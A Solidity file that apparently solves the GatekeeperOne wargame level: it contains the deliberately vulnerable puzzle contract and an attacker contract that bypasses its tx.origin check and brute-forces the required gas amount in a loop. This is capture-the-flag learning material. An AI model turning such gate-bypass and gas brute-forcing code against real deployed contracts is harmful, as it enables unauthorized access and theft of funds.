// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Atk_Gate1 {
    GatekeeperOne public target;
    uint public gas_calc;

    constructor(address _addr) {
        target = GatekeeperOne(_addr);
    }

    function enter(bytes8 _key) public {
        if (gas_calc == 0) {
            for (uint256 i = 0; i <= 8191; i++) {
                try target.enter{gas : 819100 + i}(_key) {
                    gas_calc = 819100 + i;
                    break;
                } catch {}
            }
        } else {
            target.enter{gas : gas_calc}(_key);
        }
    }
}
